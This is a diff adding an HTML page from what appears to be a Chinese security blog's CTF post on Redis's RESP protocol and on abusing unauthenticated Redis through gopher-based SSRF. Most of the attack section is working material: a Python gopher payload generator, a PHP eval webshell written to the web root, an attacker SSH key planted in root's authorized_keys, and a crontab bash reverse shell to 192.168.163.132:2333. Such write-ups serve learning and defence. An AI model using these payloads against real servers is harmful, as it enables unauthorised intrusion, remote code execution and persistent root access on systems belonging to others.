@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Luc1fer">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="redis与ssrf">
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>redis与ssrf - Luc1fer&#39;blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories/">
+                    Categories
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2019/08/10/redis/">
+                redis与ssrf
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-10</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>wula!<br>我爱学习！🤫</p>
+<a id="more"></a>
+
+<h1 id="redis协议分析"><a href="#redis协议分析" class="headerlink" title="redis协议分析"></a>redis协议分析</h1><p>tcpdump抓包</p>
+<pre><code>tcpdump -i lo port 6379 -w redis.pcap</code></pre><p>在redis执行如下命令</p>
+<pre><code>127.0.0.1:6379&gt; set name test
+OK
+127.0.0.1:6379&gt; get name
+&quot;test&quot;
+127.0.0.1:6379&gt; </code></pre><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p>RESP在Redis中用作请求-响应协议的方式如下</p>
+<pre><code>1. 客户端将命令作为`Bulk Strings`的RESP数组发送到Redis服务器。
+2. 服务器根据命令实现回复一种RESP类型。</code></pre><p>在RESP中。某些数据的类型取决于第一个字节：</p>
+<ol>
+<li>对于<code>Simple Strings</code>，回复的第一个字节是+</li>
+<li>对于<code>error</code>,回复的第一个字节是-</li>
+<li>对于<code>Integer</code>,，回复的第一个字节是:</li>
+<li>对于<code>Bulk Strings</code>,回复的第一个字节是$</li>
+<li>对于<code>array</code>,回复的第一个字节是*</li>
+<li>此外，resp能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值</li>
+<li>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束</li>
+</ol>
+<p>现在来看一下我们抓的包</p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo4o02mj30kp0cm0u3.jpg" alt="抓包协议分析1"></p>
+<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umo7bp1qj30kw0bhwfp.jpg" alt="协议分析2"></p>
+<p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5umo9n4wij30kx0b775h.jpg" alt="协议分析3"></p>
+<p><img src="http://wx4.sinaimg.cn/mw690/006boCb9ly1g5umodgmhaj30l409ugml.jpg" alt="协议分析4"></p>
+<p>整体来看一下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="整个通信过程"></p>
+<p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。</p>
+<p>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
+<h1 id="Redis配合gopher协议进行SSRF"><a href="#Redis配合gopher协议进行SSRF" class="headerlink" title="Redis配合gopher协议进行SSRF"></a>Redis配合gopher协议进行SSRF</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>能未授权或通过弱口令访问到redis服务器</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>redis常见SSRF攻击方式大概这几种：</p>
+<ol>
+<li>绝对路径写webshell</li>
+<li>写ssh公钥</li>
+<li>写contrab计划任务反弹shell</li>
+</ol>
+<h3 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h3><p>构造redis命令</p>
+<pre><code>flushall
+set 1 &apos;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&apos;
+config set dir /var/www/html
+config set dbfilename shell.php
+save</code></pre><p>转换为redis RESP格式</p>
+<pre><code>import urllib
+protocol=&quot;gopher://&quot;
+ip=&quot;192.168.163.128&quot;
+port=&quot;6379&quot;
+shell=&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+     &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+     &quot;config set dir {}&quot;.format(path),
+     &quot;config set dbfilename {}&quot;.format(filename),
+     &quot;save&quot;
+     ]
+if passwd:
+    cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+    cmd+=CRLF
+    return cmd
+
+if __name__==&quot;__main__&quot;:
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print payload</code></pre><p>生成之后用curlr然后查询shell是否写入</p>
+<p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g5umog58ioj30bl03a3z1.jpg" alt="写shell"></p>
+<p>写入成功</p>
+<h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p>
+<p>构造redis命令</p>
+<pre><code>flushall
+set 1 &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali
+&apos;
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+save</code></pre><p>改第一个脚本</p>
+<pre><code>filename=&quot;authorized_keys&quot;
+ssh_pub=&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;
+path=&quot;/root/.ssh/&quot;</code></pre><p>还是用curl打一发</p>
+<h3 id="利用contrab计划反弹shell"><a href="#利用contrab计划反弹shell" class="headerlink" title="利用contrab计划反弹shell"></a>利用contrab计划反弹shell</h3><p>Centos的定时任务在<code>/var/spool/cron/&lt;username&gt;</code>和/etc/crontab，高版本redis默认启动是redis权限，故无法实现</p>
+<p>构造redis命令</p>
+<pre><code>flushall
+set 1 &apos;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n&apos;
+config set dir /var/spool/cron/
+config set dbfilename root
+save</code></pre><p>改第一个命令</p>
+<pre><code>reverse_ip=&quot;192.168.163.132&quot;
+reverse_port=&quot;2333&quot;
+cron=&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;%(reverse_ip,reverse_port)
+filename=&quot;root&quot;
+path=&quot;/var/spool/cron&quot;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote>
+<p><a href="https://xz.aliyun.com/t/5665#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-11</a><br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>
+</blockquote>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/redis/">#redis</a> <a href="/tags/ssrf/">#ssrf</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/31/JavaScript原型污染/">JavaScript Prototype 污染攻击</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/30/SSTI/">SSTI-服务器端模板注入</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/22/HostSplit/">HostSplit-Exploitable</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/比赛回顾/">比赛回顾</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/docker/">docker</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/wp/">wp</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/渗透测试/">渗透测试</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/BrainLyh">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:brainsemail@163.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
